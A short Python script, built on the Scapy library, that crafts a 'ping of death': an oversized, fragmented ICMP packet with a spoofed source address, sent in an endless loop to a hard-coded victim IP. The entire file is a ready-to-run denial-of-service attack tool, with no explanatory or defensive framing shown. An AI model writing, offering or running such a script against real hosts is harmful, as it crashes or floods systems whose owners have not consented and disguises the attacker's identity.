#! /usr/bin/env python
from scapy.all import *

fake_ip = "192.168.1.177"
victim = "192.168.62.10"
max_length = 65535
length_POD = max_length + 1

# Preparing the packet
ping_of_death = fragment(IP(src=fake_ip,dst=victim)/ICMP()/("X"*length_POD))

# Sending packets (Stop it by pressing "CTRL+C")
send(ping_of_death,loop=1)
